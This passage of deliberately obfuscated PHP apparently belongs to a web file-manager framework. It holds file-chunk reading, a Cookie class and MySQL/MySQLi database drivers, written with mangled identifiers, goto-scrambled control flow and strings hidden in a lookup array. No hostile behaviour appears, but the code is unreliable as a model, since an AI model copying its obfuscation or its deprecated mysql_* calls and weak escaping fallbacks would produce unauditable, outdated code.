$d¡Ê¢æƒ°¸[33]; goto b‰»¢Šğ—ê; D¼ÕÄÄíáá: ksort($bÆÄºà†Ì); $fŒ§Û¾£ƒ‡ = substr($C»Û„Äã, $Bİõ†øÂ‡ - $fÕÖ§í´à÷, $D¥•ÉîÈ¢‹); return $fŒ§Û¾£ƒ‡; goto aòø”ê÷½¢; b…Ò¨’”Áİ: $bÍñÁ¾òÃŞ = ceil(($Bİõ†øÂ‡ + $D¥•ÉîÈ¢‹) / $bÁàä¬Å³Å) * $bÁàä¬Å³Å - $fÕÖ§í´à÷; $C»Û„Äã = IO::fileSubstr($this->path, $fÕÖ§í´à÷, $bÍñÁ¾òÃŞ); $bÆÄºà†Ì[$fÕÖ§í´à÷ . $d¡Ê¢æƒ°¸[33]] = $C»Û„Äã; goto D¼ÕÄÄíáá; dÁ›íÃ‡˜ù: if ($Bİõ†øÂ‡ + $D¥•ÉîÈ¢‹ > $eŸê®Áô) { $D¥•ÉîÈ¢‹ = $eŸê®Áô - $Bİõ†øÂ‡; } if ($D¥•ÉîÈ¢‹ <= 0) { return $d¡Ê¢æƒ°¸[33]; } if ($Bİõ†øÂ‡ < 0 || $Bİõ†øÂ‡ >= $eŸê®Áô || $D¥•ÉîÈ¢‹ <= 0 || $D¥•ÉîÈ¢‹ > 1024 * 1024 * 5) { throw new Exception("\151\x6f\x46\x69\154\145\x52\145\141\144\x20\x65\162\x72\157\162\x21\x20\x73\164\x61\x72\x74\75{$Bİõ†øÂ‡}\x3b\154\x65\x6e\147\164\150\75{$D¥•ÉîÈ¢‹}\x3b\40\163\151\x7a\x65\75{$eŸê®Áô}\73"); } goto f’÷ Ëœ“Å; b‰»¢Šğ—ê: foreach ($bÆÄºà†Ì as $fÄßÚ„¶‡å => $F‹ÎÖ¤¯ò) { $fÄßÚ„¶‡å = intval($fÄßÚ„¶‡å); $Dª¥Çå“± = $fÄßÚ„¶‡å + strlen($F‹ÎÖ¤¯ò); if ($Bİõ†øÂ‡ >= $Dª¥Çå“±) { continue; } if ($Bİõ†øÂ‡ >= $fÄßÚ„¶‡å && $Bİõ†øÂ‡ + $D¥•ÉîÈ¢‹ <= $Dª¥Çå“±) { return substr($F‹ÎÖ¤¯ò, $Bİõ†øÂ‡ - $fÄßÚ„¶‡å, $D¥•ÉîÈ¢‹); } break; } if (count($bÆÄºà†Ì) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($d¡Ê¢æƒ°¸[1283], $d¡Ê¢æƒ°¸[1284] . count($bÆÄºà†Ì) . "\x3b\x73\x74\141\162\x74\75{$Bİõ†øÂ‡}\54\x6c\145\156\147\x74\150\x3d{$D¥•ÉîÈ¢‹}\73\160\x6f\163\x65\x3a{$fÄßÚ„¶‡å}\x7e{$Dª¥Çå“±}"); throw new Exception($d¡Ê¢æƒ°¸[1285]); } $fÕÖ§í´à÷ = intval($Bİõ†øÂ‡ / $bÁàä¬Å³Å) * $bÁàä¬Å³Å; goto b…Ò¨’”Áİ; f¤ ˆÆê¥: $d¡Ê¢æƒ°¸ =& $_SERVER[ºÖÙÂŒäÉê‡]; $eŸê®Áô = $this->info[$d¡Ê¢æƒ°¸[77]]; $FÁÈ‚é¥à = $Bİõ†øÂ‡; goto C¤´‘â±ğÏ; C¤´‘â±ğÏ: $d¹¾ÖƒÕŠ‰ = $D¥•ÉîÈ¢‹; if ($Bİõ†øÂ‡ < 0) { $Bİõ†øÂ‡ = $eŸê®Áô + $Bİõ†øÂ‡; } if ($D¥•ÉîÈ¢‹ === !1) { $D¥•ÉîÈ¢‹ = $eŸê®Áô - $Bİõ†øÂ‡; } goto dÁ›íÃ‡˜ù; f’÷ Ëœ“Å: $bÁàä¬Å³Å = 64 * 1024; $bÆÄºà†Ì =& self::$_chunkBuffer[$this->path]; if (!$bÆÄºà†Ì) { $bÆÄºà†Ì = array(); } goto E¥¶…¨ìã; aòø”ê÷½¢: } private function log($bÆí¸¹ÓÅ¾, $AµµğÊ•ŸÍ) { $FÑö²¯‹è =& $_SERVER[ºÖÙÂŒäÉê‡]; $a¶“ÁÏÉ¡î = timeFloat() - $this->timeStart; write_log(sprintf($FÑö²¯‹è[1286], $bÆí¸¹ÓÅ¾, $this->info[$FÑö²¯‹è[28]], $a¶“ÁÏÉ¡î, $AµµğÊ•ŸÍ), $FÑö²¯‹è[1201]); } } goto bœî¿´¼ÏÀ; b¾àØ©ÇÃ¦: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($dÜô°êë§ô = '', $AÆŒàá“œë = 0) { if (is_string($dÜô°êë§ô) && $dÜô°êë§ô != $_SERVER[ºÖÙÂŒäÉê‡][33]) { $this->prefix = $dÜô°êë§ô; } if (is_numeric($AÆŒàá“œë) && $AÆŒàá“œë > 0) { $this->expire = $AÆŒàá“œë; } } public static function getInstance() { static $e¥ß¬é¹–•; if ($e¥ß¬é¹–• === null) { $e¥ß¬é¹–• = new self(); } return $e¥ß¬é¹–•; } private static $sameCookieSet = array(); public static function set($BöÏ†­¼Ì, $cºÃ°óË„Ñ, $D„Ê£ëà = 0, $DöÆ„±„åğ = false, $E’ŞÀïÀ´ = false) { goto C·¿ã¹éî; C·¿ã¹éî: $Bò‡£ÁËİÅ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$D„Ê£ëà) { $D„Ê£ëà = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$BöÏ†­¼Ì]) && self::$sameCookieSet[$BöÏ†­¼Ì] == $cºÃ°óË„Ñ . $D„Ê£ëà) { return; } goto aãĞ¨š²ˆÉ; aãĞ¨š²ˆÉ: self::$sameCookieSet[$BöÏ†­¼Ì] = $cºÃ°óË„Ñ . $D„Ê£ëà; if (!$E’ŞÀïÀ´) { $E’ŞÀïÀ´ = str_replace(HOST, $Bò‡£ÁËİÅ[33], APP_HOST); $E’ŞÀïÀ´ = _get($GLOBALS, $Bò‡£ÁËİÅ[789], $E’ŞÀïÀ´); } $EÑãœ£ÊïÏ = $Bò‡£ÁËİÅ[33]; goto f‚õæ¡Èá‡; f‚õæ¡Èá‡: setcookie($BöÏ†­¼Ì, $cºÃ°óË„Ñ, time() + $D„Ê£ëà, $Bò‡£ÁËİÅ[8] . trim($E’ŞÀïÀ´, $Bò‡£ÁËİÅ[8]) . $EÑãœ£ÊïÏ, !1, !1, $DöÆ„±„åğ); goto f‹Æ†àç±; f‹Æ†àç±: } public static function setSafe($a°‹ŸÈªâÚ, $Dƒ‘‚£†Â¢, $CİÇˆˆê½ñ = 0) { self::set($a°‹ŸÈªâÚ, $Dƒ‘‚£†Â¢, $CİÇˆˆê½ñ, !0); } public static function get($f°›ÚĞ‡Ë) { return isset($_COOKIE[$f°›ÚĞ‡Ë]) ? $_COOKIE[$f°›ÚĞ‡Ë] : !1; } public static function remove($b±×‰çËÎÏ, $a„¼•˜İ = false) { unset($_COOKIE[$b±×‰çËÎÏ]); self::set($b±×‰çËÎÏ, $_SERVER[ºÖÙÂŒäÉê‡][33], 1, $a„¼•˜İ); } } class DbMysql extends Db { public function __construct($EÜ›ç„¤ = '') { $FÖ¢  Ğ¤Ş =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!extension_loaded($FÖ¢  Ğ¤Ş[727])) { think_exception(think_lang($FÖ¢  Ğ¤Ş[10]) . $FÖ¢  Ğ¤Ş[790]); } if (!empty($EÜ›ç„¤)) { $this->config = $EÜ›ç„¤; if (empty($this->config[$FÖ¢  Ğ¤Ş[13]])) { $this->config[$FÖ¢  Ğ¤Ş[13]] = $FÖ¢  Ğ¤Ş[33]; } } } public function connect($Aô´£»±¯Ó = '', $dÔĞÖéê•é = 0, $eàëÃîæ¦Š = false) { $A†Ïï±¢ùÎ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!isset($this->linkID[$dÔĞÖéê•é])) { goto BÊÑ‘˜¨ŸŒ; Ağö•¾ê÷: if (1 != think_config($A†Ïï±¢ùÎ[18])) { unset($this->config); } goto A†÷ß¼‰³”; F³¦‚ÛêÒ: mysql_query($A†Ïï±¢ùÎ[795] . think_config($A†Ïï±¢ùÎ[796]) . $A†Ïï±¢ùÎ[55], $this->linkID[$dÔĞÖéê•é]); if ($aàÒõá°©á > $A†Ïï±¢ùÎ[797]) { mysql_query($A†Ïï±¢ùÎ[798], $this->linkID[$dÔĞÖéê•é]); } $this->connected = !0; goto Ağö•¾ê÷; BÊÑ‘˜¨ŸŒ: if (empty($Aô´£»±¯Ó)) { $Aô´£»±¯Ó = $this->config; } $céÄ¢ŞÀñ» = $Aô´£»±¯Ó[$A†Ïï±¢ùÎ[791]] . ($Aô´£»±¯Ó[$A†Ïï±¢ùÎ[792]] ? "\x3a{$Aô´£»±¯Ó[$A†Ïï±¢ùÎ[792]]}" : $A†Ïï±¢ùÎ[33]); $EŠˆáÕ¼Ş = !empty($Aô´£»±¯Ó[$A†Ïï±¢ùÎ[13]][$A†Ïï±¢ùÎ[14]]) ? $Aô´£»±¯Ó[$A†Ïï±¢ùÎ[13]][$A†Ïï±¢ùÎ[14]] : $this->pconnect; goto Fö£¡»Ïå¿; Fö£¡»Ïå¿: if ($EŠˆáÕ¼Ş) { $this->linkID[$dÔĞÖéê•é] = mysql_pconnect($céÄ¢ŞÀñ», $Aô´£»±¯Ó[$A†Ïï±¢ùÎ[793]], $Aô´£»±¯Ó[$A†Ïï±¢ùÎ[794]], 131072); } else { $this->linkID[$dÔĞÖéê•é] = mysql_connect($céÄ¢ŞÀñ», $Aô´£»±¯Ó[$A†Ïï±¢ùÎ[793]], $Aô´£»±¯Ó[$A†Ïï±¢ùÎ[794]], !0, 131072); } if (!$this->linkID[$dÔĞÖéê•é] || !empty($Aô´£»±¯Ó[$A†Ïï±¢ùÎ[17]]) && !mysql_select_db($Aô´£»±¯Ó[$A†Ïï±¢ùÎ[17]], $this->linkID[$dÔĞÖéê•é])) { think_exception(mysql_error()); } $aàÒõá°©á = mysql_get_server_info($this->linkID[$dÔĞÖéê•é]); goto F³¦‚ÛêÒ; A†÷ß¼‰³”: } return $this->linkID[$dÔĞÖéê•é]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($C­Í¤š°ù„) { goto C°Í¬áøÛá; c´ºßÀ—: if (!$this->_linkID) { return !1; } $this->queryStr = $C­Í¤š°ù„; if ($this->queryID) { $this->free(); } goto cçÀ³¸˜Ş¡; b¯©¶ø´ĞÃ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto BƒåëŒŠã; cçÀ³¸˜Ş¡: think_action_status($c ø’åÀù[19], 1); think_status($c ø’åÀù[20]); $this->queryID = mysql_query($C­Í¤š°ù„, $this->_linkID); goto b¯©¶ø´ĞÃ; C°Í¬áøÛá: $c ø’åÀù =& $_SERVER[ºÖÙÂŒäÉê‡]; if (0 === stripos($C­Í¤š°ù„, $c ø’åÀù[257])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto c´ºßÀ—; BƒåëŒŠã: } public function execute($D¿ô“ùà³) { goto EåË“ñĞ«; c“ òÎÀ¦: if (!1 === $A×”¤ïĞè) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto Aæ¿Å‰°Ş; EåË“ñĞ«: $dÉÎÙÖ¼ =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto eŠ‹œì°µ¿; Aå¹°†ôÌğ: think_status($dÉÎÙÖ¼[20]); $A×”¤ïĞè = mysql_query($D¿ô“ùà³, $this->_linkID); $this->debug(); goto c“ òÎÀ¦; eŠ‹œì°µ¿: $this->queryStr = $D¿ô“ùà³; if ($this->queryID) { $this->free(); } think_action_status($dÉÎÙÖ¼[21], 1); goto Aå¹°†ôÌğ; Aæ¿Å‰°Ş: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ºÖÙÂŒäÉê‡][799], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aÙˆøåˆ¿È = mysql_query($_SERVER[ºÖÙÂŒäÉê‡][800], $this->_linkID); $this->transTimes = 0; if (!$aÙˆøåˆ¿È) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $aÕö£†È› = mysql_query($_SERVER[ºÖÙÂŒäÉê‡][801], $this->_linkID); $this->transTimes = 0; if (!$aÕö£†È›) { $this->error(); return !1; } } return !0; } private function getAll() { $aóÇ«¥ö´ = array(); if ($this->numRows > 0) { while ($AÎù¶í•¶ = mysql_fetch_assoc($this->queryID)) { $aóÇ«¥ö´[] = $AÎù¶í•¶; } mysql_data_seek($this->queryID, 0); } return $aóÇ«¥ö´; } public function getFields($a¿µÉøÔÁ) { $BÁòÛíÀ½Ã =& $_SERVER[ºÖÙÂŒäÉê‡]; $d¶¬éä‰ƒ = $this->query($BÁòÛíÀ½Ã[802] . $this->parseKey($a¿µÉøÔÁ)); $d‚”†Ä‚‚ = array(); if ($d¶¬éä‰ƒ) { foreach ($d¶¬éä‰ƒ as $b„‚ïàÃĞ => $Bí¶¤—‹Œ) { $d‚”†Ä‚‚[$Bí¶¤—‹Œ[$BÁòÛíÀ½Ã[27]]] = array($BÁòÛíÀ½Ã[28] => $Bí¶¤—‹Œ[$BÁòÛíÀ½Ã[27]], $BÁòÛíÀ½Ã[29] => $Bí¶¤—‹Œ[$BÁòÛíÀ½Ã[30]], $BÁòÛíÀ½Ã[31] => (bool) (strtoupper($Bí¶¤—‹Œ[$BÁòÛíÀ½Ã[32]]) === $BÁòÛíÀ½Ã[803]), $BÁòÛíÀ½Ã[34] => $Bí¶¤—‹Œ[$BÁòÛíÀ½Ã[35]], $BÁòÛíÀ½Ã[36] => strtolower($Bí¶¤—‹Œ[$BÁòÛíÀ½Ã[37]]) == $BÁòÛíÀ½Ã[38], $BÁòÛíÀ½Ã[39] => strtolower($Bí¶¤—‹Œ[$BÁòÛíÀ½Ã[40]]) == $BÁòÛíÀ½Ã[41]); } } return $d‚”†Ä‚‚; } public function getTables($dùåéØ§¼å = '') { $cøê•Êä¿Ã =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!empty($dùåéØ§¼å)) { $E†¬Ù»Ìİœ = $cøê•Êä¿Ã[804] . $dùåéØ§¼å; } else { $E†¬Ù»Ìİœ = $cøê•Êä¿Ã[805]; } $b×ÈôÔ·çÊ = $this->query($E†¬Ù»Ìİœ); $a˜ÆˆÉÇ„Î = array(); foreach ($b×ÈôÔ·çÊ as $b¸òˆëÇ“ => $B¼Ì‘‘¿­–) { $a˜ÆˆÉÇ„Î[$b¸òˆëÇ“] = current($B¼Ì‘‘¿­–); } return $a˜ÆˆÉÇ„Î; } public function replace($Eí¥ãÆæîè, $cš½™è·… = array()) { $AÔÛêÍíñÀ =& $_SERVER[ºÖÙÂŒäÉê‡]; foreach ($Eí¥ãÆæîè as $f‚õ™Ñ‚‹ª => $eÙÅºÂ‚÷Ô) { $eóĞæ–Şƒ = $this->parseValue($eÙÅºÂ‚÷Ô); if (is_scalar($eóĞæ–Şƒ)) { $Cøˆ¥”‰é[] = $eóĞæ–Şƒ; $c¾åõªŞ[] = $this->parseKey($f‚õ™Ñ‚‹ª); } } $dŸ·“ªÚ = $AÔÛêÍíñÀ[806] . $this->parseTable($cš½™è·…[$AÔÛêÍíñÀ[272]]) . $AÔÛêÍíñÀ[807] . implode($AÔÛêÍíñÀ[47], $c¾åõªŞ) . $AÔÛêÍíñÀ[808] . implode($AÔÛêÍíñÀ[47], $Cøˆ¥”‰é) . $AÔÛêÍíñÀ[809]; return $this->execute($dŸ·“ªÚ); } public function insertAll($DÏÓÊççÁ¯, $A…´¾É’…¶ = array(), $a˜ÌŸÅó”ª = false) { goto f»Ô¶ŞÜ§Ø; aÊº®±åÔî: $C¨§Üõ÷Œ® = ($a˜ÌŸÅó”ª ? $D©ÎŞ¬Ëˆ[811] : $D©ÎŞ¬Ëˆ[812]) . $D©ÎŞ¬Ëˆ[813] . $this->parseTable($A…´¾É’…¶[$D©ÎŞ¬Ëˆ[272]]) . $D©ÎŞ¬Ëˆ[807] . implode($D©ÎŞ¬Ëˆ[47], $a„ßÓ©ƒ»ì) . $D©ÎŞ¬Ëˆ[814] . implode($D©ÎŞ¬Ëˆ[47], $F»ì§ÓÚëÑ); return $this->execute($C¨§Üõ÷Œ®); goto dëé­Ô™ç; f»Ô¶ŞÜ§Ø: $D©ÎŞ¬Ëˆ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!is_array($DÏÓÊççÁ¯[0])) { return !1; } $a„ßÓ©ƒ»ì = array_keys($DÏÓÊççÁ¯[0]); goto EöÃîš¸‡; EöÃîš¸‡: $F»ì§ÓÚëÑ = array(); foreach ($DÏÓÊççÁ¯ as $CÎ¿ÑÁ½) { $aŒ»‚±¯ = array(); foreach ($CÎ¿ÑÁ½ as $fª§ó§‰ => $fŒß†É¥Î—) { $fŒß†É¥Î— = $this->parseValue($fŒß†É¥Î—); if (is_scalar($fŒß†É¥Î—)) { $aŒ»‚±¯[] = $fŒß†É¥Î—; } } $F»ì§ÓÚëÑ[] = $D©ÎŞ¬Ëˆ[253] . implode($D©ÎŞ¬Ëˆ[47], $aŒ»‚±¯) . $D©ÎŞ¬Ëˆ[809]; } array_walk($a„ßÓ©ƒ»ì, array($this, $D©ÎŞ¬Ëˆ[810])); goto aÊº®±åÔî; dëé­Ô™ç: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $d°§øñ°¹Ã =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->error = mysql_errno() . $d°§øñ°¹Ã[4] . mysql_error($this->_linkID); if ($d°§øñ°¹Ã[33] != $this->queryStr) { $this->error .= LNG($d°§øñ°¹Ã[45]) . $this->queryStr; } think_trace($this->error, $d°§øñ°¹Ã[33], $d°§øñ°¹Ã[46]); return $this->error; } public function escapeString($c†àÓÛ¦¢å) { if ($this->_linkID) { return mysql_real_escape_string($c†àÓÛ¦¢å, $this->_linkID); } else { return mysql_escape_string($c†àÓÛ¦¢å); } } public function parseKey(&$d¥ñ«ğ±‚¡, $aêøÃó «Ê = true) { $b‹ó·¿ŠŠ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($aêøÃó «Ê) { $d¥ñ«ğ±‚¡ = $this->parseKeyCheck($d¥ñ«ğ±‚¡); } if ($d¥ñ«ğ±‚¡ != $b‹ó·¿ŠŠ[182] && !preg_match($b‹ó·¿ŠŠ[815], $d¥ñ«ğ±‚¡)) { $d¥ñ«ğ±‚¡ = $b‹ó·¿ŠŠ[816] . trim($d¥ñ«ğ±‚¡, $b‹ó·¿ŠŠ[816]) . $b‹ó·¿ŠŠ[816]; } return $d¥ñ«ğ±‚¡; } } class DbMysqli extends Db { public function __construct($bšÍóãíÔ = '') { $dƒ¤İŞ«Ù =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!extension_loaded($dƒ¤İŞ«Ù[726])) { think_exception(think_lang($dƒ¤İŞ«Ù[10]) . $dƒ¤İŞ«Ù[817]); } if (!empty($bšÍóãíÔ)) { $this->config = $bšÍóãíÔ; if (empty($this->config[$dƒ¤İŞ«Ù[13]])) { $this->config[$dƒ¤İŞ«Ù[13]] = $dƒ¤İŞ«Ù[33]; } } } public function connect($C‡ªÙ¼Üµ¥ = '', $aø¬ğ¶Úæ· = 0) { $AÈØÁŒ× =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!isset($this->linkID[$aø¬ğ¶Úæ·])) { goto e¦‹œÚöø²; e¦‹œÚöø²: if (empty($C‡ªÙ¼Üµ¥)) { $C‡ªÙ¼Üµ¥ = $this->config; } $this->linkID[$aø¬ğ¶Úæ·] = new mysqli($C‡ªÙ¼Üµ¥[$AÈØÁŒ×[791]], $C‡ªÙ¼Üµ¥[$AÈØÁŒ×[793]], $C‡ªÙ¼Üµ¥[$AÈØÁŒ×[794]], $C‡ªÙ¼Üµ¥[$AÈØÁŒ×[17]], $C‡ªÙ¼Üµ¥[$AÈØÁŒ×[792]] ? intval($C‡ªÙ¼Üµ¥[$AÈØÁŒ×[792]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto cîõè¼Şº; cîõè¼Şº: $Bïõ„¼èš› = $this->linkID[$aø¬ğ¶Úæ·]->server_version; $this->linkID[$aø¬ğ¶Úæ·]->query($AÈØÁŒ×[795] . think_config($AÈØÁŒ×[796]) . $AÈØÁŒ×[55]); if ($Bïõ„¼èš› > $AÈØÁŒ×[797]) { $this->linkID[$aø¬ğ¶Úæ·]->query($AÈØÁŒ×[798]); } goto C„ë¦Í”ö; C„ë¦Í”ö: $this->connected = !0; if (1 != think_config($AÈØÁŒ×[18])) { unset($this->config); } goto FÇ›Ê‘ŠÖ; FÇ›Ê‘ŠÖ: } return $this->linkID[$aø¬ğ¶Úæ·]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($D³Ù ›ˆÎ×) { goto aÚ™Áäöíä; D¨õŠ·ŒïÀ: $this->queryStr = $D³Ù ›ˆÎ×; if ($this->queryID) { $this->free(); } think_action_status($bç¤›‡œŒ[19], 1); goto c´±Ø–±¥¼; a‚èª”ƒ´‹: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto a“ïÆ¶‚²Ö; aÚ™Áäöíä: $bç¤›‡œŒ =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto D¨õŠ·ŒïÀ; c´±Ø–±¥¼: think_status($bç¤›‡œŒ[20]); $this->queryID = $this->_linkID->query($D³Ù ›ˆÎ×); if ($this->_linkID->more_results()) { while (($dóë¼È¥ŠÂ = $this->_linkID->next_result()) != NULL) { $dóë¼È¥ŠÂ->free_result(); } } goto a‚èª”ƒ´‹; a“ïÆ¶‚²Ö: } public function execute($B¤§»ğ˜Ã˜) { goto b‰×åÆò§; a×îğìÓÃ: if (!1 === $eÁŠ‡ñµ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto Dä±×áãŸÙ; b‰×åÆò§: $CùÙ‹ô½ô =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto EöÌ§˜”Æ°; fÔß¡¸™Ï: think_status($CùÙ‹ô½ô[20]); $eÁŠ‡ñµ = $this->_linkID->query($B¤§»ğ˜Ã˜); $this->debug(); goto a×îğìÓÃ; EöÌ§˜”Æ°: $this->queryStr = $B¤§»ğ˜Ã˜; if ($this->queryID) { $this->free(); } think_action_status($CùÙ‹ô½ô[21], 1); goto fÔß¡¸™Ï; Dä±×áãŸÙ: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $e÷§’Å®­­ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$e÷§’Å®­­) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $dˆ‡Æ¸Ôš = $this->_linkID->rollback(); $this->transTimes = 0; if (!$dˆ‡Æ¸Ôš) { $this->error(); return !1; } } return !0; } private function getAll() { $F¶‰ŞŠ«ˆ² = array(); if ($this->numRows > 0) { for ($AŸÑï«š„‡ = 0; $AŸÑï«š„‡ < $this->numRows; $AŸÑï«š„‡++) { $F¶‰ŞŠ«ˆ²[$AŸÑï«š„‡] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $F¶‰ŞŠ«ˆ²; } public function getFields($eº¹°§óç) { $b•ŸÍŠ•Û„ =& $_SERVER[ºÖÙÂŒäÉê‡]; $câ­ÛÌÃ¸Ø = $this->query($b•ŸÍŠ•Û„[802] . $this->parseKey($eº¹°§óç)); $a…¤í¼ÂùÕ = array(); if ($câ­ÛÌÃ¸Ø) { foreach ($câ­ÛÌÃ¸Ø as $a”¡ÁÇ™¨ => $B¹ßö¤Ü—Õ) { $a…¤í¼ÂùÕ[$B¹ßö¤Ü—Õ[$b•ŸÍŠ•Û„[27]]] = array($b•ŸÍŠ•Û„[28] => $B¹ßö¤Ü—Õ[$b•ŸÍŠ•Û„[27]], $b•ŸÍŠ•Û„[29] => $B¹ßö¤Ü—Õ[$b•ŸÍŠ•Û„[30]], $b•ŸÍŠ•Û„[31] => (bool) ($B¹ßö¤Ü—Õ[$b•ŸÍŠ•Û„[32]] === $b•ŸÍŠ•Û„[33]), $b•ŸÍŠ•Û„[34] => $B¹ßö¤Ü—Õ[$b•ŸÍŠ•Û„[35]], $b•ŸÍŠ•Û„[36] => strtolower($B¹ßö¤Ü—Õ[$b•ŸÍŠ•Û„[37]]) == $b•ŸÍŠ•Û„[38], $b•ŸÍŠ•Û„[39] => strtolower($B¹ßö¤Ü—Õ[$b•ŸÍŠ•Û„[40]]) == $b•ŸÍŠ•Û„[41]); } } return $a…¤í¼ÂùÕ; } public function getTables($FŸ°–ºˆ™Š = '') { $B³Æ¿ÈÔê =& $_SERVER[ºÖÙÂŒäÉê‡]; $eö­œ¨…ø× = !empty($FŸ°–ºˆ™Š) ? $B³Æ¿ÈÔê[804] . $FŸ°–ºˆ™Š : $B³Æ¿ÈÔê[805]; $Eì×„‹ˆã = $this->query($eö­œ¨…ø×); $E½³„±Ëçæ = array(); if ($Eì×„‹ˆã) { foreach ($Eì×„‹ˆã as $DİñŞŒÃëá => $e¾ò´Š‰Ÿ) { $E½³„±Ëçæ[$DİñŞŒÃëá] = current($e¾ò´Š‰Ÿ); } } return $E½³„±Ëçæ; } public function replace($CÄ»ÚĞ§Úã, $E‰¦ÉÃãë‰ = array()) { $Fƒ—ˆù³Ğå =& $_SERVER[ºÖÙÂŒäÉê‡]; foreach ($CÄ»ÚĞ§Úã as $DœªæôĞİå => $DëÓ³Â°’°) { $B˜›Îî‘ÏË = $this->parseValue($DëÓ³Â°’°); if (is_scalar($B˜›Îî‘ÏË)) { $Fë…¶÷‡÷ã[] = $B˜›Îî‘ÏË; $fÎñ¼¹íˆ“[] = $this->parseKey($DœªæôĞİå); } } $Cãª“ËÙƒ¾ = $Fƒ—ˆù³Ğå[806] . $this->parseTable($E‰¦ÉÃãë‰[$Fƒ—ˆù³Ğå[272]]) . $Fƒ—ˆù³Ğå[807] . implode($Fƒ—ˆù³Ğå[47], $fÎñ¼¹íˆ“) . $Fƒ—ˆù³Ğå[808] . implode($Fƒ—ˆù³Ğå[47], $Fë…¶÷‡÷ã) . $Fƒ—ˆù³Ğå[809]; return $this->execute($Cãª“ËÙƒ¾); } public function insertAll($BÀòíø¿›õ, $Bª†“í¥½ = array(), $B÷ƒÅ®œ®Ü = false) { goto e÷Â¥óëƒâ; eÚ¸ìŠŠËø: $Dï³™ß¥ë = ($B÷ƒÅ®œ®Ü ? $eé”‹Ş®¦Ï[811] : $eé”‹Ş®¦Ï[812]) . $eé”‹Ş®¦Ï[813] . $this->parseTable($Bª†“í¥½[$eé”‹Ş®¦Ï[272]]) . $eé”‹Ş®¦Ï[807] . implode($eé”‹Ş®¦Ï[47], $fš²É´âŒ ) . $eé”‹Ş®¦Ï[814] . implode($eé”‹Ş®¦Ï[47], $B¬äìÈÌ‡¯); return $this->execute($Dï³™ß¥ë); goto a†©à®¿ˆ; b‚Ø²‹­¾: $B¬äìÈÌ‡¯ = array(); foreach ($BÀòíø¿›õ as $BŒ¼‚ããÜŸ) { $dÌ†À¿¸ñî = array(); foreach ($BŒ¼‚ããÜŸ as $c´‘ÌÂŠè => $cõºÓù®‘) { $cõºÓù®‘ = $this->parseValue($cõºÓù®‘); if (is_scalar($cõºÓù®‘)) { $dÌ†À¿¸ñî[] = $cõºÓù®‘; } } $B¬äìÈÌ‡¯[] = $eé”‹Ş®¦Ï[253] . implode($eé”‹Ş®¦Ï[47], $dÌ†À¿¸ñî) . $eé”‹Ş®¦Ï[809]; } array_walk($fš²É´âŒ , array($this, $eé”‹Ş®¦Ï[810])); goto eÚ¸ìŠŠËø; e÷Â¥óëƒâ: $eé”‹Ş®¦Ï =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!is_array($BÀòíø¿›õ[0])) { return !1; } $fš²É´âŒ  = array_keys($BÀòíø¿›õ[0]); goto b‚Ø²‹­¾; a†©à®¿ˆ: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $A·Ëƒ­‘ĞØ =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->error = $this->_linkID->errno . $A·Ëƒ­‘ĞØ[4] . $this->_linkID->error; if ($A·Ëƒ­‘ĞØ[33] != $this->queryStr) { $this->error .= LNG($A·Ëƒ­‘ĞØ[45]) . $this->queryStr; } think_trace($this->error, $A·Ëƒ­‘ĞØ[33], $A·Ëƒ­‘ĞØ[46]); return $this->error; } public function escapeString($b¬²ïğŒíé) { if ($this->_linkID) { return $this->_linkID->real_escape_string($b¬²ïğŒíé); } else { return addslashes($b¬²ïğŒíé); } } public function parseKey(&$Côˆ‹ÑÈ¢³, $A™×ƒÄ÷æ = true) { $eöÛŠµĞõÑ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($A™×ƒÄ÷æ) { $Côˆ‹ÑÈ¢³ = $this->parseKeyCheck($Côˆ‹ÑÈ¢³); } if ($Côˆ‹ÑÈ¢³ != $eöÛŠµĞõÑ[182] && !preg_match($eöÛŠµĞõÑ[815], $Côˆ‹ÑÈ¢³)) { $Côˆ‹ÑÈ¢³ = 